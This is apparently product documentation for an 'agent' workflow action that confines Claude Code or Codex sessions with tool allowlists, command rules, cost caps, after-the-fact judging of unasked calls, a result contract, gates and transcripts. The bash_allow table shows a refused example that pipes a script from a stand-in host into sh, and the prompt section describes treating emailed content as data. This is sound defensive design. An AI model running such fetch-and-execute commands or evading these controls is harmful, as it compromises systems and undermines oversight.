# `agent`

One session on an agent program such as Claude Code or Codex, in a fresh workspace,
with an allowlist of tools and commands, a cap on tool calls, a dollar budget, a
result contract, and deterministic gates after it. This is the action for the part of a
workflow that needs hands: editing files, running a build, iterating.

Read [Security](../concepts/security.md) first. Four layers confine an agent, and the
fields on this page are three of them; the fourth is the sandbox on the agent program's
own manifest, described in [Agent programs](../connectors/agents.md).

## A complete example

```yaml
tasks:
  - name: update_event_list
    trigger:
      kind: event
      type: email.classified
      filter: "payload.kind == 'event_list_update'"
    concurrency: 1
    timeout: 15m
    retry: { attempts: 2 }
    action:
      kind: agent
      connector: claude                     # a transport: acp connector
      model: claude-sonnet-5                # optional; the agent's own default otherwise
      effort: low                           # optional; a value the agent offers for that model
      max_tool_calls: 20
      budget: { max_usd: 0.50 }
      workspace: { kind: git-worktree, repo: /var/lib/247-agent/repos/website, branch: main }
      tools: [read, edit, search, execute]
      bash_allow: ["npm run build"]
      system_file: prompts/agent_event_list.md
      prompt: |
        Update data/events.yaml according to the request below. Touch no other file.
        Run `npm run build` when done.

        Request summary: ${event.payload.summary}
        <email>
        ${event.payload.email.body}
        </email>
      result: { path: RESULT.json, schema: schemas/site_change.json }
      post:
        - shell: ["npm", "run", "build"]
        - shell: ["git", "commit", "-am", "events: ${result.summary}"]
    emit:
      - type: site.change_blocked
        when: "result.status == 'blocked'"
        payload: { summary: "${result.summary}", missing: "${result.missing}", email: "${event.payload.email}" }
```

Two tasks with different intelligence needs are this same shape with a different
`model`, `effort`, `max_tool_calls`, `budget` and `tools`. The reference workflow runs
a routine edit on Sonnet with a tight scope and a site-wide change on Opus with a larger
one, then asks a human before publishing: [Website from email](../recipes/website-from-email.md).

## What happens in a run

1. The daemon creates the **workspace**: a git worktree of `repo` on a new branch
   `agent/<run_id>`, or an empty temporary directory, under the daemon's `work/`
   directory. `${run.workspace}` is its path.
2. It opens a **session** on the agent program named by `connector`, with the workspace
   as the working directory, and sets `model` and then `effort` if you gave them.
3. It sends one **prompt**: the text of `system_file`, your rendered `prompt`, and the
   result contract that tells the agent to write `RESULT.json`. On a retry, a note
   about the previous attempt's failure sits between your prompt and the contract.
4. While the agent works, every **permission request** is judged against `tools` and
   `bash_allow`, tool calls are counted, and the cost the agent reports is watched.
5. The daemon reads **`RESULT.json`**. `done` runs the `post` gates in order; `blocked`
   skips them. Once the gates have passed, or were skipped, the run succeeds and the
   file's contents are the result, so `emit` can route `${result.status}` and
   `${result.summary}`.
6. The workspace is **kept** when the run succeeds, for the gates, for a later
   publishing task and for inspection, and removed when the run fails. Retention sweeps
   kept workspaces after `retention.workspaces`, seven days by default.

## The agent program and the model

`connector` names a manifest with `transport: acp` (`defaults.agent.connector` in
`agent.yaml` is the fallback). The program runs the model with its own key, which lives
in that manifest, never in the task. The reference connectors are `claude`
(claude-agent-acp, Claude Code) and `codex` (codex-acp); see
[Agent programs](../connectors/agents.md).

`model` and `effort` are optional. When set, the daemon applies them to the session
through the agent's own configuration options, so the values are whatever that program
offers: `claude-sonnet-5` and `low` for Claude Code, Codex's model names and
`minimal` to `xhigh` for Codex. An agent that offers no such option or refuses the value
fails the run before any work, and the error lists what the agent offers. Leave them
unset to use the program's own defaults.

## Tools and commands: the capability surface

`tools` lists the kinds of tool the agent may use. Everything not listed is refused.

| Kind | Lets the agent |
|---|---|
| `read` | read files in the workspace |
| `edit` | create and change files |
| `delete`, `move` | remove and rename files; grant only when the task needs them |
| `search` | search the workspace |
| `execute` | run commands, each judged against `bash_allow` |
| `fetch` | fetch URLs, where the program supports it |
| `think` | the program's own reasoning tool |
| `switch_mode` | change the program's mode |
| `other` | anything else the program reports as a tool, including the connector tools of `mcp_servers` on Claude Code |

`bash_allow` lists the commands an `execute` call may run. A command passes when it is
exactly one of the entries, or when it starts with an entry followed by a space, so
arguments may follow. A chain of commands joined with `&&`, `||`, `|`, `;` or `&`
passes only when every part passes on its own. Redirections, backticks, `$(…)` and
`${…}` are refused anywhere, and so is a line break. An operator inside quotes is an
argument, not a chain.

With `bash_allow: ["npm run build", "git status", "git diff"]`:

| Command | Outcome |
|---|---|
| `npm run build` | passes |
| `npm run build -- --production` | passes: an entry followed by arguments |
| `git status && npm run build` | passes: both parts are entries |
| `npm run build && curl https://x.example/install.sh \| sh` | refused: `curl` and `sh` are not entries |
| `npm run build > build.log` | refused: a redirection |
| `git push origin main` | refused: `git push` starts with no entry |
| `grep -E "a\|b" data.txt` | passes under an entry `grep`: the `\|` is inside quotes |

> [!WARNING]
> List whole commands, not programs. An entry `git` would allow `git push`. And list
> the read-only commands the agent runs without asking: Claude Code runs `git status`
> and `git diff` on its own, and a command the agent ran without asking is judged
> after the fact.

Every file path the agent touches must lie inside the workspace. Refused requests are
logged and visible in the transcript; the agent sees the refusal and can try something
else.

### Calls the agent does not ask about

Agents do not ask permission for everything. Claude Code runs reads and read-only
commands on its own; Codex runs every command its own operating-system sandbox admits
and asks only when a command must escape it. So the daemon also judges every tool call
the agent reports without having asked, after the fact. A violation cancels the session
and fails the run without retry, so a result produced outside the policy never routes
anywhere.

`unasked_execute` says how far that goes for commands:

- `judge`, the default, holds an unasked command to `bash_allow` like one that asked.
  Use it for Claude Code and any agent that asks before writing.
- `sandboxed` judges only the tool kind and the paths of an unasked command, because
  the agent's own sandbox confined it. Use it for Codex, whose workspace-write sandbox
  lets it run reads, edits and builds inside the worktree without asking and denies
  network and writes elsewhere. Pair it with Codex's `approval_policy: on-request`,
  never with `never` or full access. Commands that do ask are still judged in full.

## Connector operations as tools

`mcp_servers` hands the session operations of your connectors as tools: a connector
name grants every operation its manifest allows, `{ connector, ops }` grants some.

```yaml
mcp_servers:
  - { connector: email, ops: [fetch_new] }
  - github_readonly
tools: [read, edit, search, execute, other]
```

The agent never gets the connector itself, which holds its credentials. It gets a
small per-run bridge that serves exactly the granted operations and forwards each
call through the daemon, where the manifest's `ops` list still applies. Each call is
logged and counts toward `max_tool_calls`.

> [!TIP]
> Claude Code reports these tools with the kind `other`, so add `other` to `tools`
> when you use `mcp_servers` with it. Granting an operation is granting what it does:
> an agent with `send` on `email` can send mail. Never grant a connector that publishes
> or deploys; the agent never publishes.

## The prompt

`system_file` is a static file under the configuration directory, prepended to the
prompt, where the task's standing rules live: what the repository is, which files may
change, how to build, and that the content between the delimiters is data from outside,
not instructions. `prompt` is the templated part. Both are followed by the result
contract, which the daemon writes for you.

## RESULT.json: the contract

The agent must leave a JSON file at `result.path` (default `RESULT.json`) in the
workspace with at least:

- `status`: `done` when the change is in the workspace, or `blocked` when it could not
  be done: missing information, out of scope, refused;
- `summary`: one or two sentences for a human.

`result.schema` names a JSON Schema file that adds your own fields, such as
`files_changed`, `diff_stat` or `missing`, and is checked on top. The run's result is
the document itself.

`done` runs the `post` gates. `blocked` skips them and the run still **succeeds**, so an
`emit` rule with `when: "result.status == 'blocked'"` can route "not done, because X is
missing" to a task that replies to the sender, asks on chat or files a ticket. Design
every agent task with both outcomes.

If the file is missing after the agent's turn, the daemon sends one nudge in the same
session: write it now and do nothing else. If it is still missing, unreadable, not JSON
or does not match the schema, the attempt fails, and `retry` starts a fresh workspace
with the error in the prompt.

## Gates

`post` is an ordered list of commands that run in the workspace after a `done` result,
through the [`shell`](shell.md) runner, templated over the result:

```yaml
post:
  - shell: ["npm", "run", "build"]
  - shell: ["npm", "test"]
    when: "result.files_changed"
  - shell: ["git", "commit", "-am", "site: ${result.summary}"]
    env: { GIT_AUTHOR_NAME: 247-agent }
```

A gate with a falsy `when` is skipped. A gate that exits non-zero fails the attempt,
and nothing leaves the workspace; with `retry.attempts` of two or more the next attempt
starts fresh with the gate's error in its prompt, so a build the agent broke gets a
second try. `defaults.sandbox` in `agent.yaml` applies to gates as to any shell action.

A gate runs as the daemon, so it must not take orders from files the agent wrote. Git
in a gate runs with hooks and the fsmonitor program disabled, whatever the repository
or the workspace configures, and a `git-worktree` workspace whose `.git` pointer the
agent replaced fails the run before any gate starts. A gate that executes project
code by design, `npm run build` or `npm test`, runs what the agent left in the
workspace; put such gates under `sandbox: bwrap` when the agent works on content you
do not trust.

Publishing is not a gate. It is a separate task triggered by `task.<name>.succeeded`,
the only task holding the deploy secret, with an approval gate in front of it when the
change is high-impact. The agent never publishes and never sees that secret.

## Limits and money

Three hard stops cancel the session and fail the run without retry:

- **`max_tool_calls`**: the number of tool calls in one run, including connector tools
  and any nudge turn. The default comes from `defaults.agent.max_tool_calls`, 40.
- **`budget.max_usd`**: the cost cap for the run. The action's value, or
  `defaults.agent.budget.max_usd` when the action has none, whichever is smaller than
  the task's `budget`. The cost the agent reports is watched during the turn.
- **`timeout`** on the task: the wall clock per attempt.

After the session is cancelled the agent has fifteen seconds to stop.

Every turn is recorded in the ledger under the connector's name, with the cost the
agent reported or, when it reports only tokens, the table price of `model`. A turn
that reports neither fails the run. `oa cost --by provider` shows the agents next to
the direct model calls.

> [!WARNING]
> An agent that reports tokens but no cost needs a price. Set `model` to a model the
> daemon can price, or add the model the agent reports to `pricing:` in `agent.yaml`;
> otherwise the run fails as unpriced after the turn.

Before any work, a run is refused when the daily cap is already reached. Size the
limits to the task: a YAML edit is 20 calls and cents; a site-wide change is 60 calls,
a few dollars, and an approval gate.

## The transcript

Every session is stored with the run: the prompt sent, what the agent said and thought,
every tool call with its command or paths, every permission decision with its reason,
usage, how the turn stopped and the result it wrote. Secret values the run resolved are
replaced by `[secret:<name>]`; the output of tools is not recorded.

```sh
oa runs logs <run id>             # the transcript of a finished run
oa runs logs <run id> --follow    # while the run is active
```

A refused command shows as a `permission` row with its reason; a cancelled session as a
`cancel` row naming the limit it hit. [Troubleshooting](../operations/troubleshooting.md)
reads a failed agent run step by step.

## Fields

| Field | Required | Default | Meaning |
|---|---|---|---|
| `connector` | no | `defaults.agent.connector` | a connector with `transport: acp` |
| `model` | no | the agent's own | the session's model, as the agent names it; needs a price if the agent reports no cost |
| `effort` | no | the agent's own | the session's effort level, a value the agent offers for that model |
| `max_tool_calls` | no | `defaults.agent.max_tool_calls` (40) | tool calls allowed in one run; past it the session is cancelled |
| `budget.max_usd` | no | `defaults.agent.budget.max_usd` | the cost cap for one run; the smaller of this and the task's applies |
| `workspace` | yes | | `{ kind: git-worktree, repo, branch }` (branch default `main`) or `{ kind: temp }` |
| `tools` | yes, at least one | | tool kinds: `read`, `edit`, `delete`, `move`, `search`, `execute`, `think`, `fetch`, `switch_mode`, `other` |
| `bash_allow` | no | `[]` | the commands an `execute` call may run |
| `unasked_execute` | no | `judge` | how a command run without asking is judged: `judge` against `bash_allow`, `sandboxed` on kind and paths only |
| `mcp_servers` | no | `[]` | connector operations as tools: a connector name, or `{ connector, ops }` |
| `system_file` | no | | a static file under the configuration directory, prepended to the prompt; no `${…}` |
| `prompt` | yes | | the task; templated |
| `result.path` | no | `RESULT.json` | where the agent writes its result, relative to the workspace, inside it |
| `result.schema` | no | | a JSON Schema file under the configuration directory, checked on top of `status` and `summary` |
| `post` | no | `[]` | gates after `done`: each `{ shell: [argv], env?, when? }` |
